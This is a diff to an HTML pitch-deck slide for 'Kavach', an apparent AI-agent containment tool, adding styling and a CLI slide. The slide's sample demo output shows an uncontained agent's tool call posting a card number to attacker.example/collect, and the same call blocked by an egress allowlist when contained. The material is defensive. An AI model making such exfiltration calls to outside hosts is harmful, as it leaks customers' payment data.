@@ -73,11 +73,18 @@ p { margin: 0 0 14px; }
 .analogy .w { color: var(--muted); }
 .oss { display: inline-flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 650; padding: 5px 12px; border-radius: 999px;
   border: 1px solid var(--accent); color: var(--accent); background: var(--accent-soft); white-space: nowrap; flex-shrink: 0; }
+.term { position: relative; padding-top: 40px; }
+.term::before { content: ""; position: absolute; left: 18px; top: 15px; width: 11px; height: 11px; border-radius: 50%;
+  background: #f87171; box-shadow: 18px 0 0 #fbbf24, 36px 0 0 #4ade80; }
+.term .p { color: var(--faint); } .term .cmd { color: #fff; font-weight: 700; }
+.verbs { display: grid; gap: 12px; }
+.verbs .card { padding: 14px 18px; }
+.verbs code.v { font: 700 17px "JetBrains Mono", monospace; color: var(--accent); }
 .grid5 { display: grid; grid-template-columns: repeat(5, 1fr); gap: 14px; }
 .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 22px; }
 .card p { font-size: 17px; color: var(--muted); margin: 0; }
 .num { font: 700 13px "JetBrains Mono", monospace; color: var(--accent); letter-spacing: .08em; margin-bottom: 8px; display: block; }
-code.i { font-size: .86em; background: var(--accent-soft); color: var(--accent); padding: 1px 6px; border-radius: 5px; }
+code.i { white-space: nowrap; font-size: .86em; background: var(--accent-soft); color: var(--accent); padding: 1px 6px; border-radius: 5px; }
 .pill { display: inline-flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 600; padding: 4px 10px; border-radius: 999px; }
 .pill.bad { background: var(--bad-soft); color: var(--bad); }
 .pill.good { background: var(--good-soft); color: var(--good); }
@@ -337,6 +344,37 @@ pre .hl { background: rgba(251,146,60,.16); display: inline-block; width: 100%; 
     <span class="muted" style="font-size:17px"><strong style="color:var(--text)">34 lines of YAML</strong> replace a sandbox, a TLS gateway, a vault, an eBPF guard and an eval gate. Runtime, gateway, vault and baseline packs are open source; vertical packs are what a team adds.</span>
   </div>
   <div class="foot"><span>Team Kavach</span><span>Tech stack · the policy file</span></div>
+</section>
+
+<!-- 8b · The CLI -->
+<section class="slide">
+  <p class="kicker">The whole interface</p>
+  <h2 style="margin-bottom:20px">Three commands. No SDK, no agent rewrite.</h2>
+  <div class="row grow">
+    <div style="flex:1.55;min-width:0">
+<pre class="term" style="font-size:14px"><span class="p">$</span> <span class="cmd">kavach demo --ticket 2</span>            <span class="c"># no Docker: both runs, narrated</span>
+=== UNCONTAINED ===
+  tool_call   POST attacker.example/collect {card: 4242 4242 4242 4242}
+  <span class="k">-&gt; attacker got real PAN: True;  refund succeeded: True</span>
+=== WITH KAVACH ===
+  egress_blocked  POST attacker.example is not on the allowlist
+  <span class="s">-&gt; attacker got real PAN: False; refund succeeded: True</span>
+
+<span class="p">$</span> <span class="cmd">kavach run --uncontained --ticket 2</span>  <span class="c"># full stack, today's agent</span>
+<span class="p">$</span> <span class="cmd">kavach run --ticket 2</span>                <span class="c"># + gateway, vault, eBPF</span>
+<span class="p">$</span> <span class="cmd">kavach run --ticket 2 --model crusoe</span> <span class="c"># swap the model, same policy</span>
+<span class="p">$</span> <span class="cmd">kavach eval</span>                          <span class="c"># 10 attacks, both ways</span>
+<span class="s">10/10 cases pass the gate</span></pre>
+    </div>
+    <div class="verbs" style="flex:1">
+      <div class="card"><code class="v">demo</code><p>Both runs side by side on a laptop. No Docker, two minutes.</p></div>
+      <div class="card"><code class="v">run</code><p>Contain an agent with <code class="i">--policy</code>. Add <code class="i">--uncontained</code> to see it without Kavach.</p></div>
+      <div class="card"><code class="v">eval</code><p>Prove it. Nonzero exit on any leak, so CI blocks the release.</p></div>
+      <div class="card" style="border-style:dashed"><p><strong style="color:var(--text)">Where it's going:</strong> wrap any process, like <code class="i">docker run</code> wraps any image.</p>
+        <p style="margin-top:8px;font:500 13.5px 'JetBrains Mono',monospace;color:var(--accent);white-space:nowrap">kavach run --policy mh.yaml -- python agent.py</p></div>
+    </div>
+  </div>
+  <div class="foot"><span>Team Kavach</span><span>Tech stack · the CLI</span></div>
 </section>
 
 <!-- 8 · Architecture -->
